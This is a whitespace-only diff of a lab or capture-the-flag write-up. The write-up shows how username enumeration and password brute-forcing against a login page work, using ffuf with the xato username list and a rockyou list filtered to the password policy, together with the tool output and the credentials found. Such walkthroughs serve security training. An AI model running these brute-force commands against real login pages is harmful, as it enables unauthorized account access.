@@ -28,11 +28,11 @@ Now we know the password policy, it goes like this:
 
 ```ad-important
 Password does not meet our password policy:
-    Contains at least one digit
-    Contains at least one lower-case character
-    Contains at least one upper-case character
-    Contains NO special characters
-    Is exactly 12 characters long
+ Contains at least one digit
+ Contains at least one lower-case character
+ Contains at least one upper-case character
+ Contains NO special characters
+ Is exactly 12 characters long
 ```
 
 Nice, let's register an account that goes like that:
@@ -60,30 +60,30 @@ After a while, we get the following:
 ```
 ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.55.157:40800/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=test" -fr "Unknown username or password." -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : POST
- :: URL              : http://94.237.55.157:40800/login.php
- :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
- :: Header           : Content-Type: application/x-www-form-urlencoded
- :: Data             : username=FUZZ&password=test
+ :: Method : POST
+ :: URL : http://94.237.55.157:40800/login.php
+ :: Wordlist : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+ :: Header : Content-Type: application/x-www-form-urlencoded
+ :: Data : username=FUZZ&password=test
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
- :: Filter           : Regexp: Unknown username or password.
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter : Regexp: Unknown username or password.
 ________________________________________________
 
-gladys                  [Status: 200, Size: 4344, Words: 680, Lines: 91, Duration: 196ms]
+gladys [Status: 200, Size: 4344, Words: 680, Lines: 91, Duration: 196ms]
 ```
 
 We got a valid username:
@@ -111,30 +111,30 @@ After a while, we get this:
 ```
 ffuf -w filtered_rockyou.txt -u http://94.237.55.157:40800/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Invalid credentials" -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : POST
- :: URL              : http://94.237.55.157:40800/login.php
- :: Wordlist         : FUZZ: /home/samsepiol/filtered_rockyou.txt
- :: Header           : Content-Type: application/x-www-form-urlencoded
- :: Data             : username=gladys&password=FUZZ
+ :: Method : POST
+ :: URL : http://94.237.55.157:40800/login.php
+ :: Wordlist : FUZZ: /home/samsepiol/filtered_rockyou.txt
+ :: Header : Content-Type: application/x-www-form-urlencoded
+ :: Data : username=gladys&password=FUZZ
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
- :: Filter           : Regexp: Invalid credentials
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter : Regexp: Invalid credentials
 ________________________________________________
 
-dWinaldasD13            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 156ms]
+dWinaldasD13 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 156ms]
 ```
 
 We got credentials:
